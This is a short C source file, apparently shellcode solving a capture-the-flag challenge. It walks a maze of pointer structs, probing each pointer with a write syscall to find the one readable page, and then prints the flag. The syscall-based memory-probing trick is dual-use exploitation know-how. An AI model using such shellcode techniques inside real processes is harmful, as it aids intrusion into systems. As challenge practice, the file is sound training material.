#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>

long syscall_func(long number, ...);

// The struct created by the challenge
// Contains 16 pointers - only 1 of them is to a readable page
typedef struct maze_node
{
    void * pointers[16];
} maze_node_t;

// Entry point of the shellcode
int _start(void * initial_struct_pointer)
{
    // Iterate over the maze, find the valid pointer each time and continue
    maze_node_t * current_node = (maze_node_t * ) initial_struct_pointer;
    for (size_t node_index = 0; node_index < 10; node_index++)
    {
        // Find which pointer is valid
        void * valid_pointer = NULL;
        for (size_t pointer_index = 0; pointer_index < 16; ++pointer_index)
        {
            // Probe for pointer (we'll fail with -EFAULT in case the pointer is mapped with PROT_NONE)
            void * current_pointer = current_node->pointers[pointer_index];
            if (syscall_func(__NR_write, STDOUT_FILENO, current_pointer, 1) == 1)
            {
                valid_pointer = current_pointer;
                break;
            }
        }

        // Not found any valid pointer - edge case (shouldn't happen)
        if (valid_pointer == NULL)
        {
            syscall_func(__NR_exit, 1);
        }

        // Next node
        current_node = (maze_node_t *) valid_pointer;
    }

    // Write the flag to stdout, and exit!
    syscall_func(__NR_write, STDOUT_FILENO, current_node, 90);
    syscall_func(__NR_exit, 0);
}
